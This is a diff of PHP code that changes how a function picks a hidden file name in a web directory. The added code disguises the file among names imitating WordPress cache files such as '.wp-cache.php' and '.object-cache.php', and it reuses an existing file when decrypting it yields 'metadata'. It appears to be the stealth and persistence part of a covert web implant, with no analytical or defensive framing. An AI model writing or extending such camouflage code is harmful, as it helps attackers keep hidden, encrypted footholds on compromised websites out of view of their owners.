@@ -83,9 +83,33 @@ function decryptCache($encrypted) {
 }
 
 function generateSmartCacheFilename($dir) {
+    $possibleNames = [
+        '.wp-cache.php',
+        '.object-cache.php',
+        '.advanced-cache.php',
+        '.db-cache.php',
+        '.transient-cleanup.php',
+        '.query-cache.php',
+        '.metadata-cache.php',
+        '.options-cache.php'
+    ];
+    
     $existingFiles = @scandir($dir);
     if ($existingFiles === false) {
         return '.wp-cache.php';
+    }
+    
+    foreach ($possibleNames as $name) {
+        if (in_array($name, $existingFiles)) {
+            $filePath = $dir . DIRECTORY_SEPARATOR . $name;
+            $content = @file_get_contents($filePath);
+            if ($content !== false) {
+                $testData = decryptCache($content);
+                if (is_array($testData) && isset($testData['metadata'])) {
+                    return $name;
+                }
+            }
+        }
     }
     
     $patterns = [
@@ -109,30 +133,10 @@ function generateSmartCacheFilename($dir) {
     if (!empty($wordCounts)) {
         arsort($wordCounts);
         $mostCommon = array_key_first($wordCounts);
-        
-        $variations = [
-            ".wp-{$mostCommon}.php",
-            ".{$mostCommon}-helper.php",
-            ".object-{$mostCommon}.php"
-        ];
-        
-        shuffle($variations);
-        return $variations[0];
+        return ".wp-{$mostCommon}.php";
     }
     
-    $defaults = [
-        '.wp-cache.php',
-        '.object-cache.php',
-        '.advanced-cache.php',
-        '.db-cache.php',
-        '.transient-cleanup.php',
-        '.query-cache.php',
-        '.metadata-cache.php',
-        '.options-cache.php'
-    ];
-    
-    shuffle($defaults);
-    return $defaults[0];
+    return '.wp-cache.php';
 }
 
 function getUnifiedCacheFile($webRoot) {
